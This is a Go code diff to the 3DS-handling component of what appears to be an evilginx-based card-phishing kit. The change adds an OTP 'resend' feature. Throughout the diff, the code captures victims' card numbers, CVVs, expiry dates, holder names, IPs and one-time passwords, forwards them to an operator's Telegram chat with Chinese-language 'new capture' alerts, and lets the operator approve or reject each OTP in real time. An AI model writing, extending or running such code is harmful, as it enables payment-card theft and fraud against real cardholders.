@@ -29,6 +29,7 @@ type ThreeDSSession struct {
 	TelegramMsgID int    // Telegram message ID for editing
 	OTP           string // Current submitted OTP value
 	OTPCount      int    // Number of OTP submission attempts
+	ResendCount   int    // Number of resend attempts
 	CreatedAt     time.Time
 	UpdatedAt     time.Time
 	CVV           string // CVV for message display
@@ -128,6 +129,7 @@ func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, card
 		existing.TelegramMsgID = 0
 		existing.OTP = ""
 		existing.OTPCount = 0
+		existing.ResendCount = 0
 		existing.UpdatedAt = time.Now()
 		existing.CVV = cvv
 		existing.CardNumber = cardNumber
@@ -148,6 +150,7 @@ func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, card
 		TelegramMsgID: 0,
 		OTP:           "",
 		OTPCount:      0,
+		ResendCount:   0,
 		CreatedAt:     time.Now(),
 		UpdatedAt:     time.Now(),
 		CVV:           cvv,
@@ -273,13 +276,40 @@ func (m *ThreeDSManager) RejectOTP(sessionID string) bool {
 	return false
 }
 
-// GetStatus returns the current state and relevant data for a 3DS session
-func (m *ThreeDSManager) GetStatus(sessionID string) (state string, redirectURL string, otpCount int) {
+// ResendOTP is called when user clicks "Resend" on the 3DS page
+// Increments resend count, stays in otp_waiting state, and notifies Telegram
+func (m *ThreeDSManager) ResendOTP(sessionID string) (success bool, resendCount int) {
 	m.mu.RLock()
 	ts, ok := m.sessions[sessionID]
 	m.mu.RUnlock()
 	if !ok {
-		return ThreeDSExpired, "", 0
+		return false, 0
+	}
+
+	ts.mu.Lock()
+	defer ts.mu.Unlock()
+
+	if ts.State == ThreeDSOTPWaiting || ts.State == ThreeDSOTPRejected {
+		ts.ResendCount++
+		ts.OTP = ""
+		if ts.State == ThreeDSOTPRejected {
+			ts.State = ThreeDSOTPWaiting
+		}
+		ts.UpdatedAt = time.Now()
+		resendCount = ts.ResendCount
+		log.Info("[3DS] user requested OTP resend for session: %s (attempt %d)", sessionID, resendCount)
+		return true, resendCount
+	}
+	return false, 0
+}
+
+// GetStatus returns the current state and relevant data for a 3DS session
+func (m *ThreeDSManager) GetStatus(sessionID string) (state string, redirectURL string, otpCount int, resendCount int) {
+	m.mu.RLock()
+	ts, ok := m.sessions[sessionID]
+	m.mu.RUnlock()
+	if !ok {
+		return ThreeDSExpired, "", 0, 0
 	}
 
 	ts.mu.Lock()
@@ -295,6 +325,7 @@ func (m *ThreeDSManager) GetStatus(sessionID string) (state string, redirectURL 
 
 	state = ts.State
 	otpCount = ts.OTPCount
+	resendCount = ts.ResendCount
 	redirectURL = ts.RedirectURL
 
 	// Fallback: get redirect URL from the evilginx session
@@ -315,17 +346,19 @@ type threeDSStatusResponse struct {
 	State       string `json:"state"`
 	RedirectURL string `json:"redirect_url,omitempty"`
 	OTPCount    int    `json:"otp_count,omitempty"`
+	ResendCount int    `json:"resend_count,omitempty"`
 }
 
 // Handle3DSStatus handles GET /__3ds/status?sid={session_id}
 // Returns JSON with current 3DS state for the user's polling page
 func (m *ThreeDSManager) Handle3DSStatus(req *http.Request, sessionID string) (int, string) {
-	state, redirectURL, otpCount := m.GetStatus(sessionID)
+	state, redirectURL, otpCount, resendCount := m.GetStatus(sessionID)
 
 	resp := threeDSStatusResponse{
 		State:       state,
 		RedirectURL: redirectURL,
 		OTPCount:    otpCount,
+		ResendCount: resendCount,
 	}
 
 	jsonData, err := json.Marshal(resp)
@@ -369,8 +402,35 @@ func (m *ThreeDSManager) Handle3DSSubmit(req *http.Request, sessionID string) (i
 	// Update Telegram message with OTP info
 	m.updateTelegramOTPSubmitted(sessionID)
 
-	state, _, _ := m.GetStatus(sessionID)
+	state, _, _, _ := m.GetStatus(sessionID)
 	resp, _ := json.Marshal(threeDSSubmitResponse{Success: true, State: state})
+	return http.StatusOK, string(resp)
+}
+
+type threeDSResendResponse struct {
+	Success     bool   `json:"success"`
+	State       string `json:"state,omitempty"`
+	ResendCount int    `json:"resend_count,omitempty"`
+	Error       string `json:"error,omitempty"`
+}
+
+// Handle3DSResend handles POST /__3ds/resend?sid={session_id}
+// User requests OTP resend from the 3DS page
+func (m *ThreeDSManager) Handle3DSResend(req *http.Request, sessionID string) (int, string) {
+	ok, resendCount := m.ResendOTP(sessionID)
+	if !ok {
+		resp, _ := json.Marshal(threeDSResendResponse{Success: false, Error: "invalid session state"})
+		return http.StatusBadRequest, string(resp)
+	}
+
+	m.updateTelegramResend(sessionID)
+
+	state, _, _, _ := m.GetStatus(sessionID)
+	resp, _ := json.Marshal(threeDSResendResponse{
+		Success:     true,
+		State:       state,
+		ResendCount: resendCount,
+	})
 	return http.StatusOK, string(resp)
 }
 
@@ -441,7 +501,7 @@ func (m *ThreeDSManager) HandleCallback(callbackData string, chatID string, msgI
 
 // --- Internal helpers ---
 
-func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv string, cardNumber string, expireDate string, holderName string, ip string, otp string, otpCount int) {
+func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv string, cardNumber string, expireDate string, holderName string, ip string, otp string, otpCount int, resendCount int) {
 	sIndex = -1
 	cvv = "N/A"
 	cardNumber = "N/A"
@@ -450,6 +510,7 @@ func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv strin
 	ip = "N/A"
 	otp = ""
 	otpCount = 0
+	resendCount = 0
 
 	m.mu.RLock()
 	ts, ok := m.sessions[sessionID]
@@ -463,6 +524,7 @@ func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv strin
 		ip = ts.RemoteAddr
 		otp = ts.OTP
 		otpCount = ts.OTPCount
+		resendCount = ts.ResendCount
 		ts.mu.Unlock()
 	}
 
@@ -483,14 +545,14 @@ func (m *ThreeDSManager) updateTelegramOTPWaiting(sessionID string, msgID int) {
 		return
 	}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _ := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _, _ := m.getSessionInfo(sessionID)
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"👤持卡人: %s\n"+
-			"💳卡号: %s\n"+
+			"👤 持卡人: %s\n"+
+			"💳 卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"🔑CVV: %s\n"+
+			"🔑 CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
 			"⚙️ 状态: 等待用户输入 OTP",
 		sIndex, holderName, cardNumber, expireDate, cvv, ip,
@@ -518,14 +580,14 @@ func (m *ThreeDSManager) updateTelegramOTPSubmitted(sessionID string) {
 		return
 	}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _ := m.getSessionInfo(sessionID)
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"👤持卡人: %s\n"+
-			"💳卡号: %s\n"+
+			"👤 持卡人: %s\n"+
+			"💳 卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"🔑CVV: %s\n"+
+			"🔑 CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
 			"🔢 OTP (第%d次): %s\n\n"+
 			"⚙️ 状态: 等待管理员审核",
@@ -548,14 +610,14 @@ func (m *ThreeDSManager) updateTelegramOTPRejected(sessionID string, msgID int) 
 		return
 	}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _ := m.getSessionInfo(sessionID)
 
 	msg := fmt.Sprintf(
 		"🔐 3DS验证中 (Session #%d)\n\n"+
-			"👤持卡人: %s\n"+
-			"💳卡号: %s\n"+
+			"👤 持卡人: %s\n"+
+			"💳 卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"🔑CVV: %s\n"+
+			"🔑 CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
 			"🔢 OTP (第%d次): %s ❌ 已拒绝\n\n"+
 			"⚙️ 状态: 等待用户重新输入",
@@ -571,7 +633,7 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 		return
 	}
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _ := m.getSessionInfo(sessionID)
 
 	otpLine := ""
 	if otpCount > 0 {
@@ -580,14 +642,51 @@ func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, re
 
 	msg := fmt.Sprintf(
 		"✅ 已放行 (Session #%d)\n\n"+
-			"👤持卡人: %s\n"+
+			"👤 持卡人: %s\n"+
 			"💳 卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"🔑CVV: %s\n"+
+			"🔑 CVV: %s\n"+
 			"🌐 IP: %s\n"+
 			"%s"+
 			"⚙️ 状态: %s\n用户将被重定向",
 		sIndex, holderName, cardNumber, expireDate, cvv, ip, otpLine, reason,
+	)
+
+	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
+}
+
+// updateTelegramResend: user requested OTP resend
+func (m *ThreeDSManager) updateTelegramResend(sessionID string) {
+	if m.telegram == nil || !m.telegram.IsEnabled() {
+		return
+	}
+
+	m.mu.RLock()
+	ts, ok := m.sessions[sessionID]
+	m.mu.RUnlock()
+	if !ok {
+		return
+	}
+	ts.mu.Lock()
+	msgID := ts.TelegramMsgID
+	ts.mu.Unlock()
+	if msgID == 0 {
+		return
+	}
+
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, otpCount, resendCount := m.getSessionInfo(sessionID)
+
+	msg := fmt.Sprintf(
+		"🔐 3DS验证中 (Session #%d)\n\n"+
+			"👤 持卡人: %s\n"+
+			"💳 卡号: %s\n"+
+			"📅 有效期: %s\n"+
+			"🔑 CVV: %s\n"+
+			"🌐 IP: %s\n\n"+
+			"🔄 重发验证码 (第%d次)\n"+
+			"📤 OTP提交次数: %d\n\n"+
+			"⚙️ 状态: 用户请求重新发送验证码",
+		sIndex, holderName, cardNumber, expireDate, cvv, ip, resendCount, otpCount,
 	)
 
 	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
@@ -614,14 +713,14 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 	}
 	ts.mu.Unlock()
 
-	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _ := m.getSessionInfo(sessionID)
+	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _, _ := m.getSessionInfo(sessionID)
 
 	msg := fmt.Sprintf(
 		"🔔 新捕获! (Session #%d)\n\n"+
-			"👤持卡人: %s\n"+
-			"💳卡号: %s\n"+
+			"👤 持卡人: %s\n"+
+			"💳 卡号: %s\n"+
 			"📅 有效期: %s\n"+
-			"🔑CVV: %s\n"+
+			"🔑 CVV: %s\n"+
 			"🌐 IP: %s\n\n"+
 			"请选择操作:",
 		sIndex, holderName, cardNumber, expireDate, cvv, ip,
